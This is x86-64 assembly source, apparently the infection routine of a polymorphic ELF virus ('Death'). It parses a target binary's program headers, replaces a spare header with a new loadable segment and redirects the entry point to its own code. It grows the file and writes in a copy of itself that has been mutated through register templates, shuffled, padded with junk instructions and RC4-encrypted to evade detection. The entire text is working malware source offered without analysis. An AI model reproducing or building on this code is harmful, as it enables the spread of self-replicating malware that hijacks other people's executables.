	PUSH_ALLr

	mov		rax, [rbp + 16]
	add		rax, mydata.ispie
	mov		BYTE [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.zero
	mov		BYTE [rax], 1

	mov		rax, [rbp + 16]
	add		rax, mydata.p_offset
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.p_vaddr
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.p_paddr
	mov		qword [rax], 0


	mov r10, [r14 + ehdr.e_phoff]
	movzx rcx, word [r14 + ehdr.e_phnum]
	movzx rdi, word [r14 + ehdr.e_phentsize]

	xor r15, r15
	xor r11, r11
	xor r8, r8
	mov r13, 1

.loopinfection:
	push r11
	push rcx


	mov rax, r8
	mul rdi
	add rax, r10
	lea rbx, [r14 + rax]

	pop rcx
	pop r11
	inc r8
	cmp dword [rbx], 3
	jne	.no_interpinfection
.no_interpinfection:

	cmp dword [rbx], 2
	jne	.no_dynamicinfection
	; FAUT PARSER CETTE MERDE DE HEADER DYNAMIC AAAAH\
	; RBX c'est l'offset
	PUSH_ALL
	;lea		rsi, [rel path]
	;call	printf

	mov		rcx, [rbx + phdr.p_filesz]
	shr		rcx, 4
	mov		rdi, r14
	add		rdi, [rbx + phdr.p_offset]
	.parsing_dyninfection:


	mov		eax, [rdi]
	cmp		eax, 0x6ffffffb
	jne		.next_dyninfection

	mov		eax, [rdi + 8]
	test	eax, 134217728
	je		.next_dyninfection

	push	rax
	mov		rax, [rbp + 16]
	add		rax, mydata.ispie
	mov		BYTE [rax], 1
	pop		rax

.next_dyninfection:
	add		rdi, 16
	loop	.parsing_dyninfection



	POP_ALL

.no_dynamicinfection:


	cmp dword [rbx], 1
	jne .no_loadinfection

	mov rax, [rbx + phdr.p_filesz]
	add rax, [rbx + phdr.p_offset]

	mov		rdx, [rbp + 16]
	add		rdx, mydata.p_offset

	cmp rax, [rdx]
	jb .no_aboveinfection
	mov [rdx], rax

.no_above_offsetinfection:

	mov		rdx, [rbp + 16]
	add		rdx, mydata.p_vaddr

	mov rax, [rbx + phdr.p_vaddr]
	add rax, [rbx + phdr.p_memsz]

	cmp rax, [rdx]
	jb .no_aboveinfection
	mov [rdx], rax

.no_aboveinfection:
	cmp dword [rbx + phdr.p_flags], 6
	jnle .no_loadinfection
	mov r15, [rbx + phdr.p_vaddr]
	sub r15, [rbx + phdr.p_offset]

.no_loadinfection:
	cmp dword [rbx], 0
	je .useless_phinfection
	cmp dword [rbx], 4
	je .useless_phinfection
	cmp dword [rbx], 5
	je .useless_phinfection
	jmp .not_useless_phinfection

.useless_phinfection:
	mov rax, r8
	dec rax
	mul rdi
	add rax, r10
	mov r11, rax
	xor r13, r13

.not_useless_phinfection:
	dec rcx
	jnz .loopinfection


	mov		rbx, [rbp + 16]
	add		rbx, mydata.dynm
	cmp BYTE [rbx], 0
	je	.no_check_dynminfection
	mov		rbx, [rbp + 16]
	add		rbx, mydata.ispie
	cmp BYTE [rbx], 0
	je	.returninfection

.no_check_dynminfection:
	cmp r13, 1
	je	.returninfection

	mov		rax, [rbp + 16]
	add		rax, mydata.p_vaddr
	mov rax, [rax]
	mov		rdx, [rbp + 16]
	add		rdx, mydata.p_offset
	mov rdx, [rdx]
%include "functions/align_value.s"
	;call align_value

	mov		rsi, [rbp + 16]
	add		rsi, mydata.p_vaddr
	mov		[rsi], rax
	mov		rsi, [rbp + 16]
	add		rsi, mydata.entry
	mov		[rsi], rax
	mov		rsi, [rbp + 16]
	add		rsi, mydata.p_paddr
	mov		[rsi], rax

	lea rsi, [r14 + r11]

	push rdi
	push rcx
	mov rdi, rsi
	mov		rsi, [rbp + 16]
	add		rsi, mydata.new_programheader
	;lea rsi, [rel new_programheader]
	mov rcx, 56
	rep movsb
	pop rcx
	pop rdi

	mov		rax, [rbp + 16]
	add		rax, mydata.p_vaddr
	mov		rax, [rax]
	mov		[r14 + ehdr.e_entry], rax

	mov byte [r14 + 0xa], 1

	mov		rax, [rbp + 16]
	add		rax, mydata.p_offset
	mov rax, [rax]
	add rax, Death_SIZE_NO_BSS
	mov		rsi, [rbp + 16]
	add		rsi, mydata.p_offset
	cmp rax, [rsi]
	jbe .no_extendinfection




	mov rax, SYS_munmap
	mov rdi, r14
	mov		rsi, [rbp + 16]
	add		rsi, mydata.file_size
	mov rsi, [rsi]
	syscall



	mov rdi, r12
	mov		rsi, [rbp + 16]
	add		rsi, mydata.p_offset
	mov		rsi, [rsi]
	add		rsi, Death_SIZE_NO_BSS
	mov		rax, [rbp + 16]
	add		rax, mydata.file_size
	mov		[rax], rsi
	mov		rax, SYS_ftruncate
	syscall

	mov rax, SYS_mmap
	xor rdi, rdi
	mov		rsi, [rbp + 16]
	add		rsi, mydata.file_size
	mov rsi, [rsi]
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	mov r8, r12
	xor r9, r9
	syscall
	mov r14, rax
	JUNK_5
.no_extendinfection:
	push rdi
	push rsi
	push rcx

	%include "functions/updata_signature.s"
	;call update_signature




	;	le mmap de death
	mov rax, SYS_mmap
	xor rdi, rdi
	mov rsi, Death_SIZE_NO_BSS
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_PRIVATE | MAP_ANONYMOUS
	mov r8, -1
	xor r9, r9
	syscall
	;

	cmp rax, -4095
	jae .returninfection
	mov rbx, rax



	JUNK_5






	JUNK_5



	mov rdi, rbx





	mov		rsi, [rbp + 8]
	;lea rsi, [rel _start]


	mov rcx, Death_SIZE_NO_BSS
	rep movsb


	mov		r10, 10

	mov		rdx, [rbp + 16]
	;lea rdx, [rel _stop]

	lea		rdi, [rel _stop]

	mov		rax, [rbp + 8]
	;lea rcx, [rel _start]

	;lea		rax, [rel _start]

	sub		rdi, rax

	add		rdi, rbx


	mov		rax, rbx

	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_sys
	mov		r8, 9
	mov		r9, 13

	.poly:
	dec		r10
	%include "functions/polymorhp.s"
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdi
	mov		r8, 7
	mov		r9, 4
	cmp		r10, 1
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rax
	cmp		r10, 2
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rsi
	cmp		r10, 3
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdx
	cmp		r10, 4
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rcx
	cmp		r10, 5
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r10
	cmp		r10, 6
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r11
	cmp		r10, 7
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r13
	cmp		r10, 8
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r15
	cmp		r10, 9
	je		.poly


	;lea	rax, [rel start_shuffle]
	mov		rdi, [rbp + 48]
	mov		rsi, [rbp + 56]
	mov		rcx, [rbp + 8]
	;lea rcx, [rel _start]



	sub		rdi, rcx
	sub		rsi, rcx
	add		rdi, rbx
	add		rsi, rbx

	JUNK_5


	call	shuffle






	;lea		rdi, [rel _stop]



	;lea	rax, [rel end_shuffle]




	;call	shuffle





	mov rdi, rbx
	JUNK_5
	mov		rax, [rbp + 24]
	;lea rax, [rel _encrypted_start]

	mov		rcx, [rbp + 8]
	;lea rcx, [rel _start]

	sub rax, rcx
	add rdi, rax

	; RC4
	mov		rdx, [rbp + 16]
	;lea rdx, [rel _stop]
	mov		rcx, [rbp + 24]
	;lea rcx, [rel _encrypted_start]
	sub rdx, rcx
	mov rsi, rdx
	xor rdx, rdx
	call		[rbp]


	mov		rdi, r14
	mov		rax, [rbp + 16]
	add		rax, mydata.p_offset
	add rdi, [rax]
	mov rsi, rbx
	mov rcx, Death_SIZE_NO_BSS
	rep movsb

	mov rdi, rbx
	mov rsi, Death_SIZE_NO_BSS
	mov rax, SYS_munmap
	syscall

	pop rcx
	pop rsi
	pop rdi

	mov rax, SYS_munmap
	mov rdi, r14
	mov		rsi, [rbp + 16]
	add		rsi, mydata.file_size
	mov rsi, [rsi]
	syscall

.returninfection:

	mov		rax, [rbp + 16]
	add		rax, mydata.entry
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.old_entry
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.p_offset
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.p_vaddr
	mov		qword [rax], 0

	mov		rax, [rbp + 16]
	add		rax, mydata.p_paddr
	mov		qword [rax], 0

	mov rax, r13
	POP_ALLr
